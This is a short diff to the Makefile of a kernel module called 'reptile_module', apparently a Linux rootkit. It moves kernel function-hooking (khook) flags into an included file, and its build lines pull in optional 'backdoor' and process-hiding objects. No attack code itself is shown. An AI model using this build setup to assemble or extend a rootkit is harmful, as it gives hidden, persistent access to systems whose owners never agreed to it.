@@ -2,12 +2,15 @@ MODNAME		                        ?= reptile_module
 CONFIG_FILE                         := $(src)/../.config
 
 include $(CONFIG_FILE)
+include $(src)/Makefile.khook
 
 ccflags-y	                        += -I$(src)/include -Werror -fno-stack-protector -fomit-frame-pointer
-ldflags-y	                        += -T$(src)/khook/engine.lds
 
 obj-m		                        += $(MODNAME).o
 $(MODNAME)-y	                    += main.o string_helpers.o util.o
+$(MODNAME)-y += $(KHOOK_GOALS)
+ccflags-y    += $(KHOOK_CCFLAGS)
+ldflags-y    += $(KHOOK_LDFLAGS) # use LDFLAGS for old kernels
 
 $(MODNAME)-$(CONFIG_BACKDOOR)       += backdoor.o
 $(MODNAME)-$(CONFIG_HIDE_PROC)      += proc.o
